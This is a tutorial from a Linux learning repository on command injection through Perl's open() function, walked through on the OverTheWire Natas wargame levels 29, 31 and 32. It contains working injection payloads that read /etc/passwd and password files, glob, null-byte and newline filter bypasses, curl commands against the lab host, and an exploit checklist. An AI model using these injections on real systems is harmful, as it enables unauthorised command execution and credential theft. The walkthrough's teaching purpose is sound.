# 🌐 Web Security — RCE in Perl (open() Injection)

> In Perl, `open(FILE, $filename)` opens a file.
> But if `$filename` starts or ends with `|`, it runs a command.

---

## 📋 Table of Contents

- [The Perl open() Function](#the-perl-open-function)
- [Running Commands with a Pipe](#running-commands-with-a-pipe)
- [Filter Bypass Techniques](#filter-bypass-techniques)
- [Bypass with Glob](#bypass-with-glob)
- [Usage in Natas](#usage-in-natas)

---

## The Perl open() Function

The classic way to open a file in Perl:

```perl
open(FILE, $filename) or die "Cannot open: $!";
while (<FILE>) {
    print $_;
}
close(FILE);
```

In normal use, `$filename` is a file path. But Perl's `open()` function has a special feature.

---

## Running Commands with a Pipe

In Perl, the `open()` function runs a command if the file name **ends** with the `|` character:

```perl
open(FILE, "ls -la |")    # run the ls command, read its output
open(FILE, "cat /etc/passwd |")   # read /etc/passwd

# Or with | at the start (write mode):
open(FILE, "| mail user@example.com")   # write to the command
```

So `$filename = "cat /etc/natas_webpass/natas30 |"` → the password is read!

---

## Filter Bypass Techniques

Natas 29 filters the word "natas" and some characters.

### The Natas Filter

```perl
if($file =~ /natas/) {   # $file = the file name supplied by the user
    print "filtered";
}
```

File names containing the word `natas` are rejected.

### Bypass with Glob (*)

In Perl and in the shell, the `*` glob character lists matching files:

```
/etc/natas_webpass/natas30
```

`natas` is filtered, but we can use a glob:

```perl
open(FILE, "cat /etc/natas_webpass/nat* |")
# nat* → matches natas30
```

Or more specifically:

```
/etc/natas_webpass/natas3?       → natas30-39
/etc/natas_webpass/natas30       → directly (if there's a natas filter)
```

### Bypass with Null Byte

```
filename = "cat /etc/natas_webpass/natas30 |\0"
```

In some cases a null byte can confuse the filter.

---

## Usage in Natas

### Natas 29 — Perl CGI open() Injection

**Source code (Perl CGI):**

```perl
#!/usr/bin/perl
use CGI qw(:standard);

my $file = param('file');

# Filter: reject if the word "natas" is present
if ($file =~ /natas/) {
    print "filtered";
} else {
    open(FILE, $file) or print "Error";
    while (<FILE>) {
        print $_;
    }
    close(FILE);
}
```

**Exploit — With Glob:**

```
file = cat /etc/natas_webpass/natas30 |
```

But "natas" is filtered. Use a glob:

```
file = cat /etc/natas_webpass/nat?s30 |
```

`nat?s30` → matches `natas30` (`?` is a single-character wildcard).

**With curl:**

```bash
curl -u natas29:[password] \
     --data-urlencode "file=cat /etc/natas_webpass/natas30 |" \
     "http://natas29.natas.labs.overthewire.org/index.pl"
```

Or with a glob:

```bash
curl -u natas29:[password] \
     --data-urlencode "file=cat /etc/natas_webpass/nat?s30 |" \
     "http://natas29.natas.labs.overthewire.org/index.pl"
```

---

### Natas 31 — Perl open() + Newline

**Source code:**

```perl
my $file = param('file');
open(FILE, $file) or die;
while (<FILE>) { print $_; }
```

Injecting a command with a newline character:

```
file = /etc/passwd%0acat /etc/natas_webpass/natas32 |
```

`%0a` → `\n` → Perl may interpret this as a separate command.

---

### Natas 32 — Extra Filters

If there are more filters:

```perl
# Both natas and some special characters are filtered
```

Different glob combinations:

```bash
# List the /etc/natas_webpass/ directory
file = ls /etc/natas_webpass/ |

# Wildcard combinations
file = cat /etc/natas_webpass/natas3[0-9] |
file = cat /etc/natas_webpass/nata??? |
```

---

### Perl open() — Checklist

```
Detection:
  ☐ Is the application Perl CGI? (.pl extension)
  ☐ Is the parameter used as a file name?
  ☐ Are open(), opendir() used?

Exploit:
  ☐ Add | to the file name: "cat /etc/passwd |"
  ☐ Use a glob: nat?s30, nata*
  ☐ If there's a "natas" filter: nat?s or nata? or na*s
  ☐ Multiple commands with a newline: "%0acommand |"
```

---

## 🔗 Resources

- [Perl — open()](https://perldoc.perl.org/functions/open)
- [The Perl Jam 2 — Netanel Rubin](https://www.blackhat.com/docs/eu-14/materials/eu-14-Rubin-The-Perl-Jam-Exploiting-A-20-Year-Old-Vulnerability.pdf)
- [OWASP — Command Injection](https://owasp.org/www-community/attacks/Command_Injection)

---

**Previous topic:** [20_ecb_mode_vulnerability.md](./20_ecb_mode_vulnerability.md)
**Next topic:** [22_perl_cgi_param_bypass.md](./22_perl_cgi_param_bypass.md)

*This guide is part of the [waitaseC137/linux_learning](https://github.com/waitaseC137/linux_learning) repository.*
